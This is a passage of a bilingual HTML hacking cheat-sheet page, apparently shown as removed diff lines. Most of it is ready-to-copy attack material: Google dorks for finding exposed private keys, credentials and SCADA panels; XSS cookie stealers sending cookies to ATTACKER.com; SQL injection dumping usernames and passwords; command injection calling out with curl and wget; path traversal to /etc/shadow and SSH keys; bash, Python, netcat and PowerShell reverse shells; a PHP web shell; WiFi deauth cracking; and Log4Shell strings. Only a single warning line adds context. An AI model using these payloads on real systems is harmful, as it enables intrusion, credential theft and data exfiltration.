-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com filetype:bak</span></td><td data-en="Database & config backup files" data-id="File backup database & config">Database &amp; config backup files</td></tr>
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com filetype:xml inurl:config</span></td><td data-en="XML configuration files" data-id="File konfigurasi XML">XML configuration files</td></tr>
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com ext:php inurl:upload</span></td><td data-en="PHP file upload forms" data-id="Form upload file PHP">PHP file upload forms</td></tr>
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com "id_rsa" OR "id_dsa"</span></td><td data-en="Exposed private SSH keys" data-id="Private SSH key yang terexpose">Exposed private SSH keys</td></tr>
-          <tr><td><span class="dork-cat">EXPOSED FILES</span></td><td><span class="dork-query">site:target.com filetype:pem "PRIVATE KEY"</span></td><td data-en="PEM certificate & private key" data-id="PEM certificate & private key">PEM certificate &amp; private key</td></tr>
-          <tr><td><span class="dork-cat">LOGIN PAGES</span></td><td><span class="dork-query">site:target.com inurl:admin</span></td><td data-en="Website administration panels" data-id="Panel administrasi website">Website administration panels</td></tr>
-          <tr><td><span class="dork-cat">LOGIN PAGES</span></td><td><span class="dork-query">site:target.com inurl:login OR inurl:signin</span></td><td data-en="Application login pages" data-id="Halaman login aplikasi">Application login pages</td></tr>
-          <tr><td><span class="dork-cat">LOGIN PAGES</span></td><td><span class="dork-query">site:target.com intitle:"admin panel"</span></td><td data-en="Admin pages by title" data-id="Halaman admin berdasarkan title">Admin pages by title</td></tr>
-          <tr><td><span class="dork-cat">LOGIN PAGES</span></td><td><span class="dork-query">site:target.com inurl:wp-admin</span></td><td data-en="WordPress admin panel" data-id="Panel admin WordPress">WordPress admin panel</td></tr>
-          <tr><td><span class="dork-cat">LOGIN PAGES</span></td><td><span class="dork-query">site:target.com inurl:phpmyadmin</span></td><td data-en="phpMyAdmin database interface" data-id="Antarmuka database phpMyAdmin">phpMyAdmin database interface</td></tr>
-          <tr><td><span class="dork-cat">CREDENTIALS</span></td><td><span class="dork-query">site:pastebin.com "target.com" password</span></td><td data-en="Credential leaks on Pastebin" data-id="Kebocoran kredensial di Pastebin">Credential leaks on Pastebin</td></tr>
-          <tr><td><span class="dork-cat">CREDENTIALS</span></td><td><span class="dork-query">site:github.com "target.com" "password"</span></td><td data-en="Hardcoded credentials in GitHub" data-id="Kredensial hardcoded di GitHub">Hardcoded credentials in GitHub</td></tr>
-          <tr><td><span class="dork-cat">CREDENTIALS</span></td><td><span class="dork-query">site:github.com "target.com" "api_key"</span></td><td data-en="Leaked API keys in repositories" data-id="API key bocor di repositori">Leaked API keys in repositories</td></tr>
-          <tr><td><span class="dork-cat">CREDENTIALS</span></td><td><span class="dork-query">site:github.com "target.com" "secret_key"</span></td><td data-en="Secret keys in source code" data-id="Secret key dalam source code">Secret keys in source code</td></tr>
-          <tr><td><span class="dork-cat">CREDENTIALS</span></td><td><span class="dork-query">site:trello.com "target.com"</span></td><td data-en="Internal info in Trello cards" data-id="Info internal di Trello cards">Internal info in Trello cards</td></tr>
-          <tr><td><span class="dork-cat">DIR LISTING</span></td><td><span class="dork-query">site:target.com intitle:"index of /"</span></td><td data-en="Active directory listing" data-id="Directory listing aktif">Active directory listing</td></tr>
-          <tr><td><span class="dork-cat">DIR LISTING</span></td><td><span class="dork-query">site:target.com intitle:"index of" "parent directory"</span></td><td data-en="Open directory with files" data-id="Open directory dengan file">Open directory with files</td></tr>
-          <tr><td><span class="dork-cat">DIR LISTING</span></td><td><span class="dork-query">site:target.com intitle:"index of" passwd</span></td><td data-en="Directory containing passwd file" data-id="Directory dengan file passwd">Directory containing passwd file</td></tr>
-          <tr><td><span class="dork-cat">ERROR MSGS</span></td><td><span class="dork-query">site:target.com "SQL syntax" OR "mysql_fetch"</span></td><td data-en="SQL Injection error exposure" data-id="Eksposur error SQL Injection">SQL Injection error exposure</td></tr>
-          <tr><td><span class="dork-cat">ERROR MSGS</span></td><td><span class="dork-query">site:target.com "Warning: include()"</span></td><td data-en="PHP include() error → LFI hint" data-id="Error PHP include() → petunjuk LFI">PHP include() error → LFI hint</td></tr>
-          <tr><td><span class="dork-cat">ERROR MSGS</span></td><td><span class="dork-query">site:target.com intitle:"error" "stack trace"</span></td><td data-en="Stack trace from application crash" data-id="Stack trace dari crash aplikasi">Stack trace from application crash</td></tr>
-          <tr><td><span class="dork-cat">ERROR MSGS</span></td><td><span class="dork-query">site:target.com "ORA-" OR "Oracle error"</span></td><td data-en="Oracle database error" data-id="Error database Oracle">Oracle database error</td></tr>
-          <tr><td><span class="dork-cat">NETWORK DEVICES</span></td><td><span class="dork-query">intitle:"router" inurl:setup.cgi</span></td><td data-en="Open router setup panel" data-id="Panel setup router terbuka">Open router setup panel</td></tr>
-          <tr><td><span class="dork-cat">NETWORK DEVICES</span></td><td><span class="dork-query">intitle:"AXIS" inurl:view/view.shtml</span></td><td data-en="Open AXIS cameras" data-id="Kamera AXIS terbuka">Open AXIS cameras</td></tr>
-          <tr><td><span class="dork-cat">NETWORK DEVICES</span></td><td><span class="dork-query">inurl:/view.shtml "Live View"</span></td><td data-en="Public CCTV & IP cameras" data-id="CCTV & IP camera publik">Public CCTV &amp; IP cameras</td></tr>
-          <tr><td><span class="dork-cat">NETWORK DEVICES</span></td><td><span class="dork-query">intitle:"VNC desktop" inurl:5800</span></td><td data-en="VNC server open via web" data-id="VNC server terbuka di web">VNC server open via web</td></tr>
-          <tr><td><span class="dork-cat">NETWORK DEVICES</span></td><td><span class="dork-query">intitle:"SCADA" inurl:index.html</span></td><td data-en="Exposed SCADA/ICS interface" data-id="Interface SCADA/ICS terbuka">Exposed SCADA/ICS interface</td></tr>
-          <tr><td><span class="dork-cat">TECH SPECIFIC</span></td><td><span class="dork-query">site:target.com inurl:".git/HEAD"</span></td><td data-en="Exposed .git repository" data-id="Repositori .git terexpose">Exposed .git repository</td></tr>
-          <tr><td><span class="dork-cat">TECH SPECIFIC</span></td><td><span class="dork-query">site:target.com inurl:".svn/entries"</span></td><td data-en="Exposed SVN repository" data-id="Repositori SVN terexpose">Exposed SVN repository</td></tr>
-          <tr><td><span class="dork-cat">TECH SPECIFIC</span></td><td><span class="dork-query">site:target.com "Powered by Jira"</span></td><td data-en="Jira project management exposed" data-id="Jira project management terexpose">Jira project management exposed</td></tr>
-          <tr><td><span class="dork-cat">TECH SPECIFIC</span></td><td><span class="dork-query">site:target.com inurl:jenkins</span></td><td data-en="Jenkins CI/CD dashboard" data-id="Dashboard Jenkins CI/CD">Jenkins CI/CD dashboard</td></tr>
-          <tr><td><span class="dork-cat">TECH SPECIFIC</span></td><td><span class="dork-query">site:target.com "swagger" OR "api-docs"</span></td><td data-en="Exposed API documentation" data-id="Dokumentasi API terexpose">Exposed API documentation</td></tr>
-          <tr><td><span class="dork-cat">CLOUD</span></td><td><span class="dork-query">site:s3.amazonaws.com "target"</span></td><td data-en="Public S3 buckets belonging to target" data-id="S3 bucket publik milik target">Public S3 buckets belonging to target</td></tr>
-          <tr><td><span class="dork-cat">CLOUD</span></td><td><span class="dork-query">site:blob.core.windows.net "target"</span></td><td data-en="Public Azure Blob storage" data-id="Azure Blob storage publik">Public Azure Blob storage</td></tr>
-          <tr><td><span class="dork-cat">CLOUD</span></td><td><span class="dork-query">site:storage.googleapis.com "target"</span></td><td data-en="Public Google Cloud Storage" data-id="Google Cloud Storage publik">Public Google Cloud Storage</td></tr>
-          <tr><td><span class="dork-cat">JUICY INFO</span></td><td><span class="dork-query">site:target.com filetype:xls "password"</span></td><td data-en="Spreadsheets containing passwords" data-id="Spreadsheet berisi password">Spreadsheets containing passwords</td></tr>
-          <tr><td><span class="dork-cat">JUICY INFO</span></td><td><span class="dork-query">site:target.com "internal use only"</span></td><td data-en="Internal confidential documents" data-id="Dokumen rahasia internal">Internal confidential documents</td></tr>
-          <tr><td><span class="dork-cat">JUICY INFO</span></td><td><span class="dork-query">site:target.com "confidential" filetype:pdf</span></td><td data-en="Indexed confidential PDFs" data-id="PDF rahasia yang terindeks">Indexed confidential PDFs</td></tr>
-          <tr><td><span class="dork-cat">JUICY INFO</span></td><td><span class="dork-query">site:target.com intext:"BEGIN RSA PRIVATE KEY"</span></td><td data-en="RSA private key in page content" data-id="RSA private key dalam halaman">RSA private key in page content</td></tr>
-          <tr><td><span class="dork-cat">JUICY INFO</span></td><td><span class="dork-query">site:target.com intext:"Authorization: Bearer"</span></td><td data-en="Exposed Bearer tokens" data-id="Bearer token yang terexpose">Exposed Bearer tokens</td></tr>
-          <tr><td><span class="dork-cat">VULN HUNT</span></td><td><span class="dork-query">site:target.com inurl:"redirect" inurl:"url="</span></td><td data-en="Open redirect vulnerability" data-id="Celah open redirect">Open redirect vulnerability</td></tr>
-          <tr><td><span class="dork-cat">VULN HUNT</span></td><td><span class="dork-query">site:target.com inurl:"?file=" OR inurl:"?path="</span></td><td data-en="Local/Remote File Inclusion" data-id="Local/Remote File Inclusion">Local/Remote File Inclusion</td></tr>
-          <tr><td><span class="dork-cat">VULN HUNT</span></td><td><span class="dork-query">site:target.com inurl:"search" "q="</span></td><td data-en="Search parameter → XSS test point" data-id="Parameter pencarian → titik uji XSS">Search parameter → XSS test point</td></tr>
-        </tbody>
-      </table>
-    </div>
-
-    <!-- ═══════════════════════════════════════════════════ PAYLOADS -->
-    <div class="section" id="sec-payloads">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> PAYLOADS</div>
-        <div class="section-badge">XSS · SQLi · RCE · LFI</div>
-      </div>
-      <div class="alert-box danger">
-        <span>⛔</span>
-        <span data-en="The payloads below are only for testing on systems with official written authorization. Using them on unauthorized systems is a criminal offense."
-              data-id="Payload di bawah hanya untuk pengujian pada sistem yang telah mendapat otorisasi resmi. Penggunaan pada sistem tanpa izin adalah tindak pidana.">
-          The payloads below are only for testing on systems with official written authorization. Using them on unauthorized systems is a criminal offense.
-        </span>
-      </div>
-
-      <div class="sub-heading">▌ XSS PAYLOADS</div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">BASIC XSS</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com">// Basic script injection</span>
-<span class="kw">&lt;script&gt;</span>alert(<span class="str">'XSS'</span>)<span class="kw">&lt;/script&gt;</span>
-<span class="kw">&lt;script&gt;</span>alert(document.cookie)<span class="kw">&lt;/script&gt;</span>
-<span class="com">// Image onerror bypass</span>
-<span class="kw">&lt;img src=x onerror=</span>alert(<span class="str">'xss'</span>)<span class="kw">&gt;</span>
-<span class="kw">&lt;img src=x onerror=</span>alert(document.domain)<span class="kw">&gt;</span>
-<span class="com">// SVG vector</span>
-<span class="kw">&lt;svg onload=</span>alert(<span class="str">'xss'</span>)<span class="kw">&gt;</span>
-<span class="kw">&lt;svg/onload=</span>alert(<span class="str">`${document.domain}`</span>)<span class="kw">&gt;</span></div>
-      </div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">FILTER BYPASS XSS</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com">// Case variation bypass</span>
-<span class="kw">&lt;ScRiPt&gt;</span>alert(<span class="str">'XSS'</span>)<span class="kw">&lt;/sCrIpT&gt;</span>
-<span class="com">// Event handler bypass</span>
-<span class="kw">&lt;body onload=</span>alert(<span class="str">'xss'</span>)<span class="kw">&gt;</span>
-<span class="kw">&lt;input onfocus=</span>alert(<span class="str">'xss'</span>) <span class="kw">autofocus&gt;</span>
-<span class="com">// JavaScript URI</span>
-<span class="kw">&lt;a href=</span><span class="str">javascript:alert('xss')</span><span class="kw">&gt;</span>Click<span class="kw">&lt;/a&gt;</span>
-<span class="com">// HTML entity encoding</span>
-<span class="kw">&lt;img src=x onerror=</span>&#97;&#108;&#101;&#114;&#116;(1)<span class="kw">&gt;</span>
-<span class="com">// Double URL encode</span>
-%253Cscript%253Ealert(1)%253C/script%253E</div>
-      </div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">COOKIE STEALER XSS</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com">// Send cookie to attacker server</span>
-<span class="kw">&lt;script&gt;</span>
-  new Image().src = <span class="str">'http://ATTACKER.com/steal?c='</span> + document.cookie;
-<span class="kw">&lt;/script&gt;</span>
-<span class="com">// Fetch API version</span>
-<span class="kw">&lt;script&gt;</span>
-  fetch(<span class="str">'https://ATTACKER.com/steal?c='</span> + btoa(document.cookie));
-<span class="kw">&lt;/script&gt;</span>
-<span class="com">// One-liner</span>
-<span class="kw">&lt;svg onload=</span>fetch(`//ATTACKER.com?c=${btoa(document.cookie)}`)&gt;</div>
-      </div>
-
-      <div class="sub-heading">▌ SQL INJECTION PAYLOADS</div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">DETECTION — ERROR-BASED</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com">-- Basic detection probes</span>
-<span class="str">'  ''  `  ``  ,  "  ""  /  //  \  \\  ;</span>
-<span class="com">-- Boolean-based</span>
-<span class="str">' OR '1'='1</span>
-<span class="str">' OR 1=1 --</span>
-<span class="str">1' ORDER BY 1--</span>
-<span class="str">1' ORDER BY 2--</span>
-<span class="str">1' ORDER BY 3--   </span><span class="com">-- Increase until error</span>
-<span class="com">-- UNION-based detection</span>
-<span class="str">1' UNION SELECT NULL--</span>
-<span class="str">1' UNION SELECT NULL,NULL--</span>
-<span class="str">1' UNION SELECT NULL,NULL,NULL--</span></div>
-      </div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">SQLi — DATA EXTRACTION</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com">-- MySQL: Extract database & tables</span>
-<span class="str">' UNION SELECT 1,database(),3--</span>
-<span class="str">' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--</span>
-<span class="str">' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--</span>
-<span class="str">' UNION SELECT 1,group_concat(username,':',password),3 FROM users--</span>
-<span class="com">-- Time-based blind SQLi</span>
-<span class="str">'; IF (1=1) WAITFOR DELAY '0:0:5'--</span>
-<span class="str">' AND SLEEP(5)--</span></div>
-      </div>
-
-      <div class="sub-heading">▌ COMMAND INJECTION & RCE</div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">COMMAND INJECTION</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com"># Command injection delimiters</span>
-<span class="kw">;</span> whoami  <span class="kw">|</span> whoami  <span class="kw">||</span> whoami  <span class="kw">&amp;</span> whoami  <span class="kw">&amp;&amp;</span> whoami
-<span class="kw">`</span>whoami<span class="kw">`</span>   <span class="kw">$(</span>whoami<span class="kw">)</span>
-
-<span class="com"># Blind injection — DNS callback</span>
-; nslookup ATTACKER.com
-; curl http://ATTACKER.com/`whoami`
-; wget http://ATTACKER.com/?x=`id`
-
-<span class="com"># Windows</span>
-<span class="kw">&amp;</span> whoami <span class="kw">&amp;</span>   <span class="kw">|</span> net user   <span class="kw">;</span> ipconfig</div>
-      </div>
-
-      <div class="sub-heading">▌ LFI / PATH TRAVERSAL</div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">LOCAL FILE INCLUSION</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com"># Basic path traversal</span>
-../etc/passwd
-../../etc/passwd
-../../../etc/passwd
-....//....//etc/passwd
-..%2F..%2Fetc%2Fpasswd
-
-<span class="com"># Windows path traversal</span>
-..\windows\system32\drivers\etc\hosts
-..%5C..%5Cwindows%5Csystem32
-
-<span class="com"># Null byte bypass (PHP &lt; 5.3)</span>
-../etc/passwd%00
-../etc/passwd%00.jpg
-
-<span class="com"># Interesting files</span>
-/etc/passwd   /etc/shadow   /etc/hosts
-/proc/version   /var/log/apache2/access.log
-~/.ssh/id_rsa   /var/www/html/config.php</div>
-      </div>
-
-      <div class="sub-heading">▌ REVERSE SHELL PAYLOADS</div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">REVERSE SHELLS</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com"># Bash TCP reverse shell</span>
-bash -i >& /dev/tcp/<span class="var">ATTACKER_IP</span>/<span class="var">PORT</span> 0>&1
-
-<span class="com"># Python 3 reverse shell</span>
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="var">ATTACKER_IP</span>",<span class="var">PORT</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-
-<span class="com"># Netcat reverse shell</span>
-nc -e /bin/sh <span class="var">ATTACKER_IP</span> <span class="var">PORT</span>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span class="var">ATTACKER_IP</span> <span class="var">PORT</span> >/tmp/f
-
-<span class="com"># PHP web shell</span>
-<span class="kw">&lt;?php</span> <span class="kw">system</span>(<span class="var">$_GET</span>[<span class="str">'cmd'</span>]); <span class="kw">?&gt;</span>
-
-<span class="com"># PowerShell reverse shell</span>
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<span class="var">ATTACKER_IP</span>",<span class="var">PORT</span>);</div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════════════════════════════════════ NETWORK -->
-    <div class="section" id="sec-network">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> <span data-en="NETWORK ATTACKS" data-id="SERANGAN JARINGAN">NETWORK ATTACKS</span></div>
-        <div class="section-badge">MiTM · WIRELESS · PIVOTING</div>
-      </div>
-      <div class="cat-grid">
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📶</div><div class="card-name">WIRELESS ATTACKS</div><div class="card-tag tag-exploit">EXPLOIT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Attacks against WiFi networks: WPA handshake capture, evil twin, deauthentication."
-                 data-id="Serangan terhadap jaringan WiFi: WPA handshake capture, evil twin, deauthentication.">
-              Attacks against WiFi networks: WPA handshake capture, evil twin, deauthentication.
-            </div>
-            <ul class="card-items">
-              <li><code>airmon-ng start wlan0</code> — <span data-en="Enable monitor mode" data-id="Aktifkan monitor mode">Enable monitor mode</span></li>
-              <li><code>airodump-ng wlan0mon</code> — <span data-en="Scan WiFi networks" data-id="Scan jaringan WiFi">Scan WiFi networks</span></li>
-              <li><code>aireplay-ng --deauth 10 -a [BSSID] wlan0mon</code> — <span data-en="Deauth attack" data-id="Serangan deauth">Deauth attack</span></li>
-              <li><code>aircrack-ng -w wordlist.txt capture.cap</code> — <span data-en="WPA crack" data-id="Crack WPA">WPA crack</span></li>
-              <li data-en="Hostapd-WPE — WPA Enterprise credential capture" data-id="Hostapd-WPE — Capture kredensial WPA Enterprise">Hostapd-WPE — WPA Enterprise credential capture</li>
-              <li data-en="WiFi-Pumpkin — Evil twin & phishing portal" data-id="WiFi-Pumpkin — Evil twin & portal phishing">WiFi-Pumpkin — Evil twin &amp; phishing portal</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🕵️</div><div class="card-name">MAN-IN-THE-MIDDLE</div><div class="card-tag tag-exploit">EXPLOIT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Intercept and modify traffic between victim and gateway."
-                 data-id="Intersepsi dan modifikasi traffic antara korban dan gateway.">
-              Intercept and modify traffic between victim and gateway.
-            </div>
-            <ul class="card-items">
-              <li><code>arpspoof -i eth0 -t [VICTIM] [GATEWAY]</code> — <span data-en="ARP spoofing" data-id="ARP spoofing">ARP spoofing</span></li>
-              <li data-en="Bettercap — All-in-one MiTM framework" data-id="Bettercap — Framework MiTM lengkap">Bettercap — All-in-one MiTM framework</li>
-              <li data-en="Ettercap — Network sniffer & MiTM" data-id="Ettercap — Sniffer jaringan & MiTM">Ettercap — Network sniffer &amp; MiTM</li>
-              <li data-en="mitmproxy — HTTP/S traffic interception" data-id="mitmproxy — Intersepsi traffic HTTP/S">mitmproxy — HTTP/S traffic interception</li>
-              <li data-en="Responder — NBT-NS / LLMNR poisoning" data-id="Responder — Poisoning NBT-NS / LLMNR">Responder — NBT-NS / LLMNR poisoning</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🔑</div><div class="card-name">PASSWORD ATTACKS</div><div class="card-tag tag-exploit">EXPLOIT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Brute force, dictionary attacks, and credential stuffing against services."
-                 data-id="Brute force, dictionary attack, dan credential stuffing pada layanan.">
-              Brute force, dictionary attacks, and credential stuffing against services.
-            </div>
-            <ul class="card-items">
-              <li><code>hydra -L users.txt -P pass.txt ssh://target</code> — <span data-en="SSH brute" data-id="Brute SSH">SSH brute</span></li>
-              <li><code>hashcat -m 0 hash.txt wordlist.txt</code> — <span data-en="MD5 crack" data-id="Crack MD5">MD5 crack</span></li>
-              <li><code>hashcat -m 1000 ntlm.txt rockyou.txt</code> — <span data-en="NTLM crack" data-id="Crack NTLM">NTLM crack</span></li>
-              <li><code>john --wordlist=rockyou.txt hash.txt</code> — John the Ripper</li>
-              <li data-en="CrackStation — Online hash database lookup" data-id="CrackStation — Lookup database hash online">CrackStation — Online hash database lookup</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🔀</div><div class="card-name">PIVOTING & TUNNELING</div><div class="card-tag tag-post">POST-EX</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Lateral movement and tunneling through internal networks."
-                 data-id="Lateral movement dan tunneling melalui jaringan internal.">
-              Lateral movement and tunneling through internal networks.
-            </div>
-            <ul class="card-items">
-              <li><code>ssh -L 8080:internal:80 user@pivot</code> — <span data-en="SSH local port forward" data-id="Forward port lokal SSH">SSH local port forward</span></li>
-              <li><code>ssh -D 1080 user@pivot</code> — <span data-en="SOCKS proxy via SSH" data-id="Proxy SOCKS via SSH">SOCKS proxy via SSH</span></li>
-              <li data-en="Chisel — Fast TCP/UDP tunnel over HTTP" data-id="Chisel — Tunnel TCP/UDP cepat via HTTP">Chisel — Fast TCP/UDP tunnel over HTTP</li>
-              <li data-en="Ligolo-ng — Layer 3 tunneling via reverse shell" data-id="Ligolo-ng — Tunneling layer 3 via reverse shell">Ligolo-ng — Layer 3 tunneling via reverse shell</li>
-              <li data-en="proxychains — Route tools through SOCKS proxy" data-id="proxychains — Arahkan tools melalui proxy SOCKS">proxychains — Route tools through SOCKS proxy</li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div class="terminal">
-        <div class="terminal-bar"><div class="term-dot td-red"></div><div class="term-dot td-amber"></div><div class="term-dot td-green"></div><span>terminal@redteam ~ wireless attack session</span></div>
-        <div class="terminal-body">
-<span class="t-comment"># Enable monitor mode</span>
-<span class="t-prompt">root@kali:~# </span><span class="t-cmd">airmon-ng check kill && airmon-ng start wlan0</span>
-<span class="t-out">phy0  wlan0mon    rtl8812au  Realtek 802.11ac</span>
-<span class="t-comment"># Scan for targets</span>
-<span class="t-prompt">root@kali:~# </span><span class="t-cmd">airodump-ng wlan0mon --band abg</span>
-<span class="t-out"> BSSID              PWR  CH   ENC    ESSID</span>
-<span class="t-out"> AA:BB:CC:DD:EE:FF  -45   6  WPA2   TARGET_CORP</span>
-<span class="t-comment"># Capture handshake via deauth</span>
-<span class="t-prompt">root@kali:~# </span><span class="t-cmd">aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon</span>
-<span class="t-err">WPA handshake: AA:BB:CC:DD:EE:FF [captured]</span>
-<span class="t-comment"># Crack captured handshake</span>
-<span class="t-prompt">root@kali:~# </span><span class="t-cmd">hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt</span>
-<span class="t-out">Speed.#1.........: 2847.8 MH/s</span>
-        </div>
-      </div>
-    </div>
-
-    <!-- ═══════════════════════════════════════════════════ WEB APP -->
-    <div class="section" id="sec-webapp">
-      <div class="section-header">
-        <div class="section-title"><span>//</span> WEB APP TESTING</div>
-        <div class="section-badge">OWASP TOP 10</div>
-      </div>
-      <div class="cat-grid">
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🔓</div><div class="card-name">AUTHENTICATION BYPASS</div><div class="card-tag tag-exploit">EXPLOIT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Authentication bypass techniques in web applications."
-                 data-id="Teknik bypass autentikasi pada aplikasi web.">
-              Authentication bypass techniques in web applications.
-            </div>
-            <ul class="card-items">
-              <li data-en="Default credentials: admin:admin, admin:password, root:root" data-id="Kredensial default: admin:admin, admin:password, root:root">Default credentials: admin:admin, admin:password, root:root</li>
-              <li data-en="JWT None algorithm: alg=none payload manipulation" data-id="JWT algoritma None: manipulasi payload alg=none">JWT None algorithm: alg=none payload manipulation</li>
-              <li data-en="JWT weak secret brute: jwt_tool, hashcat mode 16500" data-id="Brute secret JWT lemah: jwt_tool, hashcat mode 16500">JWT weak secret brute: jwt_tool, hashcat mode 16500</li>
-              <li data-en="Password reset poisoning via Host header" data-id="Keracunan reset password via header Host">Password reset poisoning via Host header</li>
-              <li data-en="2FA bypass: response manipulation, race condition" data-id="Bypass 2FA: manipulasi respons, race condition">2FA bypass: response manipulation, race condition</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">📁</div><div class="card-name">FILE UPLOAD BYPASS</div><div class="card-tag tag-payload">PAYLOAD</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Bypass file upload validation to achieve RCE via webshell."
-                 data-id="Bypass validasi file upload untuk mendapatkan RCE melalui webshell.">
-              Bypass file upload validation to achieve RCE via webshell.
-            </div>
-            <ul class="card-items">
-              <li data-en="Double extension: shell.php.jpg, shell.php.png" data-id="Ekstensi ganda: shell.php.jpg, shell.php.png">Double extension: shell.php.jpg, shell.php.png</li>
-              <li data-en="Null byte: shell.php%00.jpg (PHP < 5.3)" data-id="Null byte: shell.php%00.jpg (PHP < 5.3)">Null byte: shell.php%00.jpg (PHP &lt; 5.3)</li>
-              <li data-en="MIME type spoofing: Content-Type: image/jpeg" data-id="Pemalsuan MIME type: Content-Type: image/jpeg">MIME type spoofing: Content-Type: image/jpeg</li>
-              <li data-en="Magic bytes: Prepend GIF89a; before PHP code" data-id="Magic bytes: Tambah GIF89a; sebelum kode PHP">Magic bytes: Prepend GIF89a; before PHP code</li>
-              <li data-en="Alternate extensions: .phtml .phar .php5 .shtml" data-id="Ekstensi alternatif: .phtml .phar .php5 .shtml">Alternate extensions: .phtml .phar .php5 .shtml</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">🔄</div><div class="card-name">SSRF ATTACKS</div><div class="card-tag tag-exploit">EXPLOIT</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Server-Side Request Forgery to access internal resources."
-                 data-id="Server-Side Request Forgery untuk akses internal resources.">
-              Server-Side Request Forgery to access internal resources.
-            </div>
-            <ul class="card-items">
-              <li><code>http://localhost/admin</code> — <span data-en="Internal admin panel" data-id="Panel admin internal">Internal admin panel</span></li>
-              <li><code>http://169.254.169.254/latest/meta-data/</code> — <span data-en="AWS metadata" data-id="Metadata AWS">AWS metadata</span></li>
-              <li><code>http://metadata.google.internal/</code> — <span data-en="GCP metadata" data-id="Metadata GCP">GCP metadata</span></li>
-              <li><code>file:///etc/passwd</code> — <span data-en="Local file read" data-id="Baca file lokal">Local file read</span></li>
-              <li data-en="Bypass: 127.1, 0x7f000001, 017700000001" data-id="Bypass: 127.1, 0x7f000001, 017700000001">Bypass: 127.1, 0x7f000001, 017700000001</li>
-            </ul>
-          </div>
-        </div>
-        <div class="tool-card">
-          <div class="card-header"><div class="card-icon">💉</div><div class="card-name">INJECTION ATTACKS</div><div class="card-tag tag-payload">PAYLOAD</div></div>
-          <div class="card-body">
-            <div class="card-desc" data-en="Various injection types beyond SQLi and XSS."
-                 data-id="Berbagai jenis injection selain SQLi dan XSS.">
-              Various injection types beyond SQLi and XSS.
-            </div>
-            <ul class="card-items">
-              <li>SSTI: <code>{{7*7}}</code> <code>${7*7}</code> <code>#{7*7}</code></li>
-              <li>LDAP: <code>*)(&amp;</code> <code>*)(uid=*</code></li>
-              <li data-en="XML/XXE: External entity declaration" data-id="XML/XXE: Deklarasi entitas eksternal">XML/XXE: External entity declaration</li>
-              <li>NoSQL: <code>{"$ne": null}</code> <code>{"$gt": ""}</code></li>
-              <li>CRLF: <code>%0d%0a</code> <span data-en="for header injection" data-id="untuk injeksi header">for header injection</span></li>
-              <li>Log4Shell: <code>${jndi:ldap://attacker.com/x}</code></li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div class="payload-block">
-        <div class="payload-header"><span class="payload-label">SERVER-SIDE TEMPLATE INJECTION (SSTI)</span><button class="copy-btn" onclick="copyPayload(this)" data-en="COPY" data-id="SALIN">COPY</button></div>
-        <div class="payload-code"><span class="com"># Detection probes</span>
-<span class="str">{{7*7}}</span>       <span class="com"># Jinja2, Twig → 49</span>
